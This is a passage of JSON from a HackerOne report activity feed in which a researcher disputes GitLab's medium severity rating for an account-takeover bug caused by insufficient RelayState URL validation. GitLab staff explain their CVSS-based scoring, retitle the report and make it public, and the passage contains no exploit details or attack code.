          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/102/224/c7a38e937595fb38aba8f664ca35626c15243a0d_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21889394,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@bull,\n\nWe award bounties based on CVSS scores. CVSS scores for reports to our program take into consideration the impact on self-managed instances as well as .com. As you can already tell, configurations on both can sometimes vary by a lot, which also affects the final CVSS score. Therefore `(please exclude self instance all at once)` is simply not possible. As for the disclosure, please wait for 30 days, starting from the patch release that fixed this issue.\n\nBest,\n@ameya_gitlab ",
      "automated_response": false,
      "created_at": "2023-05-17T12:12:38.782Z",
      "updated_at": "2023-05-17T12:12:38.782Z",
      "actor": {
        "username": "ameya_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/ameya_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ollldnbeou8kry1g922mk4altzqz/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21890159,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "What i mean by `please exclude self instance all at once`\n\nLet us assume, this report has no impact on self hosted instance,\n\n\nAnd has account takeover on .com\n\n\nIt is `high` according to me\n\n\n\nFor example \nAlot of issues for ex rce you diaclosed previously\n\nNeed account in the gitlab instance itself, or .com\n\n\n\nWhile .com is self registration\n\n\nWhich is not exploitable on self hosted, since most instances are private.\n\nThere is a large user base on only .com and still is a `critical`\n\n\n\nIm sorry it dosnt make sense in all cases, while i already know you consider both self hosted and .com\n\n\n\nThis is a scenerio where already a large user base of gitlab, is affected anyways.\n\n\nAnd it is not fair of you to consider this medium.\n\n\n\nPlease change the title of the report before disclouser?",
      "automated_response": false,
      "created_at": "2023-05-17T13:01:00.849Z",
      "updated_at": "2023-05-17T13:05:38.179Z",
      "actor": {
        "username": "bull",
        "cleared": true,
        "verified": true,
        "url": "/bull",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/102/224/c7a38e937595fb38aba8f664ca35626c15243a0d_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21894026,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Lets keep this simple, @gitlab\n\n\n\n**What is the severity of account takeover on gitlab.com?**\n\n\n\n\n\n----------------\n\nAnything outside of this only can add up to this severity, not lower it. This makes no sense to me.\n\n",
      "automated_response": false,
      "created_at": "2023-05-17T17:26:32.069Z",
      "updated_at": "2023-05-17T17:29:35.670Z",
      "actor": {
        "username": "bull",
        "cleared": true,
        "verified": true,
        "url": "/bull",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/102/224/c7a38e937595fb38aba8f664ca35626c15243a0d_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 22085162,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportTitleUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2023-05-30T08:39:56.965Z",
      "updated_at": "2023-05-30T08:39:56.965Z",
      "additional_data": {
        "old_title": "Steal Bitbucket Access token and all the Repositories data!",
        "new_title": "Account takeover due to insufficient URL validation on RelayState parameter"
      },
      "actor": {
        "username": "ameya_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/ameya_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ollldnbeou8kry1g922mk4altzqz/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 22085284,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2023-05-30T08:46:23.891Z",
      "updated_at": "2023-05-30T08:46:23.891Z",
      "actor": {
        "username": "ameya_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/ameya_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ollldnbeou8kry1g922mk4altzqz/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 22085286,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2023-05-30T08:46:24.106Z",
      "updated_at": "2023-05-30T08:46:24.106Z",
      "actor": {
        "username": "ameya_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/ameya_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ollldnbeou8kry1g922mk4altzqz/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}